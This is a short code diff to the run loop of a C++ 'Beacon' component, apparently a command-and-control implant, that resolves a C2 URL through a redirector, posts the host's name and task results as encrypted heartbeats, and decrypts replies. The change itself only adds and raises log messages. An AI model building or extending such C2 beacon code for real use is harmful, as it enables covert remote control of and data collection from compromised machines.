@@ -116,11 +116,12 @@ void Beacon::run() {
 
         if (c2Url_.empty()) {
             try {
-                LOG_DEBUG("Attempting to resolve C2 URL from: " + std::string(core::REDIRECTOR_URL));
+                LOG_INFO("Attempting to resolve C2 URL from: " + std::string(core::REDIRECTOR_URL));
                 c2Url_ = resolver.resolve();
-                LOG_INFO("C2 URL resolved: " + c2Url_);
+                LOG_INFO("C2 URL resolved successfully: " + c2Url_);
                 c2FetchBackoff_ = core::C2_FETCH_BACKOFF; // Reset backoff on success
-            } catch (const std::exception&) {
+            } catch (const std::exception& e) {
+                LOG_ERR("Failed to resolve C2 URL: " + std::string(e.what()));
                 std::this_thread::sleep_for(std::chrono::duration<double>(c2FetchBackoff_));
                 if (c2FetchBackoff_ < 35 * 60) {
                     c2FetchBackoff_ *= 2;
@@ -138,7 +139,7 @@ void Beacon::run() {
                 {"host", getHostname()},
                 {"results", nlohmann::json::array()}
             };
-            LOG_DEBUG("Sending beacon heart-beat...");
+            LOG_INFO("Sending beacon heart-beat to " + c2Url_ + " ...");
 
             // Move limited subset of results to in-flight to avoid 413
             int cappedCount = 0;
@@ -200,6 +201,7 @@ void Beacon::run() {
             std::vector<BYTE> response = client.post(std::wstring(urlComp.lpszHostName), std::wstring(urlComp.lpszUrlPath), encrypted_payload, headers);
 
             if (response.size() >= 12) {
+                LOG_INFO("Received valid encrypted response from C2.");
                 std::vector<BYTE> response_nonce(response.begin(), response.begin() + 12);
                 std::vector<BYTE> response_ciphertext(response.begin() + 12, response.end());
                 std::vector<BYTE> decrypted_response = aes.decrypt(response_ciphertext, response_nonce);
